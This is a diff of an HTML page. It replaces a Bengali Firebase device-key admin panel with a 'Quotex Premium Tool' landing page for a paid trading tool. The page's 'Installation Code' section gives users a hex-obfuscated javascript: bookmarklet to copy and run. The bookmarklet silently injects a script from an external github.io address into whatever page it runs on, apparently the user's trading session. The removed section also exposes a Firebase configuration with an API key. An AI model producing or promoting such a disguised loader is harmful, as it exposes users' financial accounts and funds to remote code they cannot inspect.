@@ -1,218 +1,269 @@
-<!doctype html>
-<html lang="bn">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>ডিভাইস ম্যানেজার অ্যাডমিন</title>
-  <style>
-    :root{font-family: 'Segoe UI', Roboto, Arial, sans-serif}
-    body{max-width:1000px;margin:18px auto;padding:18px}
-    h1{font-size:20px;margin-bottom:6px}
-    .card{border:1px solid #ddd;padding:12px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.04)}
-    label{display:block;margin-top:8px;font-weight:600}
-    input,select,button{padding:8px;border-radius:6px;border:1px solid #ccc;font-size:14px}
-    .row{display:flex;gap:10px;flex-wrap:wrap}
-    .col{flex:1 1 220px}
-    table{width:100%;border-collapse:collapse;margin-top:12px}
-    th,td{border:1px solid #eee;padding:8px;text-align:left}
-    th{background:#f7f7f7}
-    .actions button{margin-right:6px}
-    .small{font-size:13px;color:#555}
-    .btn{cursor:pointer}
-    .btn-primary{background:#0b74de;color:#fff;border:none}
-    .btn-danger{background:#e04b4b;color:#fff;border:none}
-    .btn-ghost{background:transparent;border:1px solid #ccc}
-    .toggle{cursor:pointer}
-    .topbar{display:flex;gap:8px;align-items:center;justify-content:space-between}
-    .search{min-width:220px}
-    .controls{display:flex;gap:8px}
-    pre{background:#f6f8fa;padding:8px;border-radius:6px;overflow:auto}
-    @media(max-width:600px){.row{flex-direction:column}}
-  </style>
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Quotex Premium</title>
+
+<link rel="icon" href="https://i.postimg.cc/FsZx0RMQ/quotex-io-logo-png-seeklogo-431725.png">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+    font-family:Poppins,sans-serif;
+    background:
+        radial-gradient(circle at top left,#ff00cc,#3333ff 40%,transparent 70%),
+        radial-gradient(circle at bottom right,#00ffd5,#ffcc00 45%,transparent 75%),
+        #05040a;
+    color:#fff;
+}
+.container{max-width:1400px;margin:auto;padding:80px 20px}
+.page{display:none}
+.page.active{display:block}
+
+/* ===== GLASS TITLE ===== */
+.title-glass{
+    max-width:900px;
+    margin:0 auto 25px;
+    padding:35px 40px;
+    text-align:center;
+    border-radius:30px;
+    background:rgba(255,255,255,0.15);
+    backdrop-filter:blur(25px);
+    border:2px solid rgba(255,255,255,0.35);
+    box-shadow:0 30px 80px rgba(0,0,0,.6);
+}
+.title-glass h1{
+    font-size:3.4rem;
+    font-weight:900;
+    background:linear-gradient(90deg,#ff6ec4,#7873f5,#4facfe);
+    -webkit-background-clip:text;
+    -webkit-text-fill-color:transparent;
+}
+.subtitle{opacity:.9;margin-top:12px}
+
+/* ===== GRID ===== */
+.grid{
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(300px,1fr));
+    gap:40px;
+    margin-top:80px;
+}
+
+/* ===== CARD ===== */
+.card{
+    background:rgba(255,255,255,.14);
+    backdrop-filter:blur(22px);
+    border-radius:30px;
+    padding:55px 35px;
+    text-align:center;
+    cursor:pointer;
+    transition:.45s;
+    border:2px solid rgba(255,255,255,.25);
+}
+.card:hover{
+    transform:translateY(-18px) scale(1.03);
+    box-shadow:0 35px 80px rgba(0,0,0,.6);
+}
+.device{
+    width:120px;height:120px;margin:0 auto 30px;
+    border-radius:30px;display:flex;align-items:center;justify-content:center;
+    font-size:65px;
+}
+.android{background:linear-gradient(135deg,#3ddc84,#00ff9c)}
+.pc{background:linear-gradient(135deg,#4facfe,#00c6ff)}
+.apple{background:linear-gradient(135deg,#111,#666)}
+
+.card h3{font-size:1.8rem;font-weight:800}
+
+/* ===== BUTTON ===== */
+.btn{
+    margin-top:60px;
+    padding:18px 55px;
+    border-radius:60px;
+    border:none;
+    cursor:pointer;
+    font-weight:800;
+    font-size:1.1rem;
+    display:inline-flex;
+    gap:12px;
+    align-items:center;
+    background:linear-gradient(135deg,#ff6ec4,#7873f5,#4facfe);
+    color:#fff;
+}
+.btn:hover{transform:scale(1.07)}
+
+.btn-install{
+    margin-top:70px;
+    box-shadow:0 15px 45px rgba(120,115,245,.45);
+}
+
+/* ===== PLACEHOLDER VIDEO ===== */
+.video-placeholder{
+    max-width:900px;
+    margin:70px auto;
+    border-radius:30px;
+    padding:80px 40px;
+    text-align:center;
+    background:rgba(0,0,0,.6);
+    border:2px dashed rgba(255,255,255,.3);
+}
+.video-placeholder i{
+    font-size:80px;
+    margin-bottom:25px;
+    opacity:.8;
+}
+.video-placeholder h2{
+    font-size:2rem;
+    font-weight:800;
+    margin-bottom:15px;
+}
+.video-placeholder p{opacity:.85;line-height:1.8}
+
+/* ===== CODE ===== */
+.code-box{
+    background:#000;
+    border-radius:25px;
+    padding:30px;
+    margin:40px 0;
+    font-family:monospace;
+    color:#00ffcc;
+    word-break:break-all;
+    box-shadow:inset 0 0 25px rgba(0,255,204,.4);
+}
+.btn-copy{
+    width:100%;
+    background:linear-gradient(135deg,#00ffd5,#00ff9c);
+    color:#000;
+}
+
+/* ===== SUPPORT ===== */
+.telegram{
+    margin-top:90px;
+    text-align:center;
+}
+.telegram a{
+    display:inline-flex;
+    gap:12px;
+    align-items:center;
+    padding:18px 55px;
+    border-radius:60px;
+    background:linear-gradient(135deg,#0088cc,#00c6ff);
+    color:#fff;
+    font-weight:900;
+    text-decoration:none;
+}
+</style>
 </head>
+
 <body>
-  <h1>ডিভাইস ম্যানেজার অ্যাডমিন প্যানেল</h1>
-  <div class="card">
-    <div class="topbar">
-      <div class="search">
-        <input id="searchInput" placeholder="Search device_id বা key লিখুন" style="width:100%" />
-      </div>
-      <div class="controls">
-        <button class="btn btn-primary" id="exportBtn">JSON এক্সপোর্ট</button>
-        <button class="btn btn-ghost" id="importBtn">JSON ইনপোর্ট</button>
-        <button class="btn btn-ghost" id="clearStorage">LocalStorage ক্লিয়ার</button>
-      </div>
+<div class="container">
+
+<!-- HOME -->
+<div id="home" class="page active">
+    <div class="title-glass">
+        <h1>Quotex Premium Tool</h1>
+        <div class="subtitle">Professional • Secure • Trusted by Serious Traders</div>
     </div>
 
-    <form id="deviceForm" style="margin-top:12px">
-      <div class="row">
-        <div class="col">
-          <label>ডিভাইস আইডি</label>
-          <input id="device_id" required />
+    <div class="grid">
+        <div class="card" onclick="showPage('android')">
+            <div class="device android"><i class="fab fa-android"></i></div>
+            <h3>Android Setup</h3>
         </div>
-        <div class="col">
-          <label>Key</label>
-          <input id="key" required />
+        <div class="card" onclick="showPage('pc')">
+            <div class="device pc"><i class="fas fa-desktop"></i></div>
+            <h3>PC / Windows</h3>
         </div>
-        <div class="col">
-          <label>Expiry Date</label>
-          <input id="expirydate" type="date" />
+        <div class="card" onclick="showPage('iphone')">
+            <div class="device apple"><i class="fab fa-apple"></i></div>
+            <h3>iPhone / iPad</h3>
         </div>
-        <div class="col">
-          <label>Allow Offline</label>
-          <select id="allowoffline">
-            <option value="true">Allowed (true)</option>
-            <option value="false">Not allowed (false)</option>
-          </select>
-        </div>
-      </div>
-      <div style="margin-top:10px">
-        <button class="btn btn-primary" id="saveBtn">ক্রিয়েট / আপডেট করুন</button>
-        <button type="button" class="btn btn-ghost" id="resetBtn">রিসেট</button>
-      </div>
-    </form>
+    </div>
 
-    <table id="devicesTable">
-      <thead>
-        <tr>
-          <th>Device ID</th>
-          <th>Key</th>
-          <th>Expiry Date</th>
-          <th>AllowOffline</th>
-          <th>Actions</th>
-        </tr>
-      </thead>
-      <tbody></tbody>
-    </table>
+    <!-- INSTALL CODE BUTTON (RESTORED) -->
+    <div style="text-align:center">
+        <button class="btn btn-install" onclick="showPage('code')">
+            <i class="fas fa-download"></i> Get Installation Code
+        </button>
+    </div>
 
-    <p class="small">CRUD + Firebase Realtime Database সমর্থিত।</p>
-  </div>
+    <div class="telegram">
+        <a href="https://t.me/DEVNILOY" target="_blank">
+            <i class="fab fa-telegram"></i> Official Support & License: @DEVNILOY
+        </a>
+    </div>
+</div>
 
-  <script>
-    // Firebase config
-    const firebaseConfig = {
-      apiKey: "AIzaSy8m3iuH0de6K31q58DlDcm4RFsJfNTt0Y",
-      authDomain: "xsiam-8cd91.firebaseapp.com",
-      databaseURL: "https://xsiam-8cd91-default-rtdb.firebaseio.com",
-      projectId: "xsiam-8cd91",
-      storageBucket: "xsiam-8cd91.appspot.com",
-      messagingSenderId: "20529006593",
-      appId: "1:20529006593:web:xxxxx"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const dbRef = firebase.database().ref('devices');
+<!-- ANDROID -->
+<div id="android" class="page">
+    <div class="title-glass"><h1>Android Setup</h1></div>
+    <div class="video-placeholder">
+        <i class="fas fa-video-slash"></i>
+        <h2>Setup Video Coming Soon</h2>
+        <p>Android installation video will be added later.</p>
+    </div>
+    <div style="text-align:center"><button class="btn" onclick="showPage('home')">⬅ Back</button></div>
+</div>
 
-    // DOM
-    const tBody = document.querySelector('#devicesTable tbody');
-    const form = document.getElementById('deviceForm');
-    const deviceIdInput = document.getElementById('device_id');
-    const keyInput = document.getElementById('key');
-    const expiryInput = document.getElementById('expirydate');
-    const allowSelect = document.getElementById('allowoffline');
-    const saveBtn = document.getElementById('saveBtn');
-    const resetBtn = document.getElementById('resetBtn');
-    const searchInput = document.getElementById('searchInput');
+<!-- PC -->
+<div id="pc" class="page">
+    <div class="title-glass"><h1>PC Setup</h1></div>
+    <div class="video-placeholder">
+        <i class="fas fa-video-slash"></i>
+        <h2>Setup Video Coming Soon</h2>
+        <p>PC installation guide will be added soon.</p>
+    </div>
+    <div style="text-align:center"><button class="btn" onclick="showPage('home')">⬅ Back</button></div>
+</div>
 
-    let devices = [];
-    let editIndex = -1;
+<!-- IPHONE -->
+<div id="iphone" class="page">
+    <div class="title-glass"><h1>iPhone / iPad Setup</h1></div>
+    <div class="video-placeholder">
+        <i class="fas fa-video-slash"></i>
+        <h2>Setup Video Coming Soon</h2>
+        <p>iPhone / iPad setup video will be available soon.</p>
+    </div>
+    <div style="text-align:center"><button class="btn" onclick="showPage('home')">⬅ Back</button></div>
+</div>
 
-    // Firebase থেকে লোড
-    dbRef.on('value', snapshot => {
-      devices = snapshot.val() ? Object.values(snapshot.val()) : [];
-      renderTable();
-    });
+<!-- CODE -->
+<div id="code" class="page">
+    <div class="title-glass"><h1>Installation Code</h1></div>
 
-    function renderTable(filter=''){
-      tBody.innerHTML = '';
-      const list = devices.filter(d => {
-        if(!filter) return true;
-        const q = filter.toLowerCase();
-        return d.device_id.toLowerCase().includes(q) || (d.key||'').toLowerCase().includes(q);
-      });
-      list.forEach((d, idx)=>{
-        const tr = document.createElement('tr');
-        tr.innerHTML = `
-          <td>${d.device_id}</td>
-          <td>${d.key}</td>
-          <td>${d.expirydate || ''}</td>
-          <td><input type="checkbox" ${d.Allowoffline? 'checked':''} data-idx="${idx}" class="allow-toggle" /></td>
-          <td class="actions">
-            <button class="btn btn-ghost" data-action="edit" data-idx="${idx}">Edit</button>
-            <button class="btn btn-danger" data-action="delete" data-idx="${idx}">Delete</button>
-          </td>
-        `;
-        tBody.appendChild(tr);
-      });
-      document.querySelectorAll('.allow-toggle').forEach(el => {
-        el.addEventListener('change', e => {
-          const i = Number(el.getAttribute('data-idx'));
-          devices[i].Allowoffline = el.checked;
-          saveToFirebase();
-        });
-      });
-      document.querySelectorAll('button[data-action]').forEach(btn => {
-        btn.addEventListener('click', e => {
-          const action = btn.getAttribute('data-action');
-          const i = Number(btn.getAttribute('data-idx'));
-          if(action === 'edit') startEdit(i);
-          if(action === 'delete') doDelete(i);
-        });
-      });
-    }
+    <div class="code-box" id="codeText">
+javascript:(function(){var _0x1a3e=["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x69\x61\x6D\x7A\x73\x61\x2E\x67\x69\x74\x68\x75\x62\x2E\x69\x6F\x2F\x51\x55\x4F\x54\x45\x58\x50\x43\x43\x4F\x4F\x44\x2F","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64"];var x=document[_0x1a3e[0]]("script");x[_0x1a3e[1]]=_0x1a3e[2];document.body[_0x1a3e[3]](x);})();
+    </div>
 
-    function startEdit(i){
-      const d = devices[i];
-      editIndex = i;
-      deviceIdInput.value = d.device_id;
-      keyInput.value = d.key;
-      expiryInput.value = d.expirydate.split('-').reverse().join('-');
-      allowSelect.value = d.Allowoffline ? 'true':'false';
-      saveBtn.textContent = 'আপডেট করুন';
-    }
+    <button class="btn btn-copy" onclick="copyCode()">
+        <i class="fas fa-copy"></i> Copy Code
+    </button>
 
-    function doDelete(i){
-      if(!confirm('আপনি কি এই ডিভাইস মুছে ফেলতে চান?')) return;
-      devices.splice(i,1);
-      saveToFirebase();
-    }
+    <div style="text-align:center">
+        <button class="btn" onclick="showPage('home')" style="margin-top:40px">⬅ Back</button>
+    </div>
+</div>
 
-    function resetForm(){
-      editIndex = -1;
-      form.reset();
-      saveBtn.textContent = 'ক্রিয়েট / আপডেট করুন';
-    }
+</div>
 
-    function saveToFirebase(){
-      const obj = {};
-      devices.forEach(d=>{
-        obj[d.device_id] = d;
-      });
-      dbRef.set(obj);
-    }
-
-    form.addEventListener('submit', e => {
-      e.preventDefault();
-      const device_id = deviceIdInput.value.trim();
-      const key = keyInput.value.trim();
-      const expiry = expiryInput.value ? expiryInput.value.split('-').reverse().join('-') : '';
-      const allow = allowSelect.value === 'true';
-      const payload = { device_id, key, expirydate: expiry, Allowoffline: allow };
-      if(editIndex >=0){
-        devices[editIndex] = payload;
-      }else{
-        const idx = devices.findIndex(d=>d.device_id===device_id);
-        if(idx>=0){ devices[idx] = payload; }
-        else{ devices.push(payload); }
-      }
-      saveToFirebase();
-      resetForm();
-    });
-
-    resetBtn.addEventListener('click', resetForm);
-    searchInput.addEventListener('input', e=> renderTable(e.target.value));
-  </script>
+<script>
+function showPage(id){
+    document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    window.scrollTo(0,0);
+}
+function copyCode(){
+    const t=document.createElement("textarea");
+    t.value=document.getElementById("codeText").innerText.trim();
+    document.body.appendChild(t);
+    t.select();
+    document.execCommand("copy");
+    document.body.removeChild(t);
+    alert("Code Copied Successfully!");
+}
+</script>
 </body>
 </html>
